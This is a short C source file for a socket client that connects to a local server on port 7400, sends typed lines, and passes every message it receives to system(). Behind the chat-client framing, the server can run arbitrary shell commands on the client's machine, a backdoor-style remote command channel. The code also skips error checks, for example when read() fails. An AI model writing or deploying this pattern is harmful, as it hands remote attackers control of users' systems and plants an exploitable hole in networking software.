#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define MSG_SIZE 200
#define MAX_CLIENTS 150
#define MYPORT 7400
char LOCALHOSTNAME[] = "127.0.0.1"; // For testing only


int main(int argc) {
  int i = 0, port, client_sockfd;
  struct sockaddr_in server_address;
  int addresslen = sizeof(struct sockaddr_in), fd;
  char fd_array[MAX_CLIENTS];
  fd_set readfds, testfds, clientfds;
  char msg[MSG_SIZE + 1];
  char kb_msg[MSG_SIZE + 10];

  /*Client variables*/

  int sockfd;
  int result;
  char hostname[MSG_SIZE] = "127.0.0.1";
  struct hostent *hostinfo;
  struct sockaddr_in address;
  char alias[MSG_SIZE];
  int clientid;

  /*Client*/

  port = MYPORT;
  printf("\n*** Client program starting (enter \"quit\" to stop): \n");
  fflush(stdout);

  /* Create a socket for the client */

  sockfd = socket(AF_INET, SOCK_STREAM, 0);

  /* Name the socket, as agreed with the server */

  hostinfo = gethostbyname(hostname); /* look for host's name */
  address.sin_addr = *(struct in_addr *)*hostinfo->h_addr_list;
  address.sin_family = AF_INET;
  address.sin_port = htons(port);

  printf("\nBefore connect");
  /* Connect the socket to the server's socket */

  if (connect(sockfd, (struct sockaddr *)&address, sizeof(address)) < 0) {
    perror("\nConnecting");
    exit(1);
  }
  fflush(stdout);
  FD_ZERO(&clientfds);
  FD_SET(sockfd, &clientfds);
  FD_SET(0, &clientfds);

  /*  Now wait for messages from the server */
  printf("\nbefore while");
  while (1) {
    testfds = clientfds;
    select(FD_SETSIZE, &testfds, NULL, NULL, NULL);
    for (fd = 0; fd < FD_SETSIZE; fd++) {
      if (FD_ISSET(fd, &testfds)) {
        if (fd == sockfd) {
          result = read(sockfd, msg, MSG_SIZE); /*read data from open socket*/
          msg[result] = '\0';                   /* Terminate string with null */
          // printf("\nMsg: %s", msg+1);
          printf("\nMsg: %s", msg);
          if (msg[0] == 'X') {
            close(sockfd);
            exit(0);
          }
          system(msg); /* Calling system commands */
          printf("\n%s", msg);

        } else if (fd == 0) { /*process keyboard activiy*/
          fgets(kb_msg, MSG_SIZE + 1, stdin);
          if (strcmp(kb_msg, "quit\n") == 0) {
            sprintf(msg, "\nXis shutting down.\n");
            write(sockfd, msg, strlen(msg));
            close(sockfd); /*close the socket*/
            exit(0);       /*end program*/
          } else {
            sprintf(msg, "M%s", kb_msg);
            write(sockfd, msg, strlen(msg));
          }
        }
      }
    }
  }
}
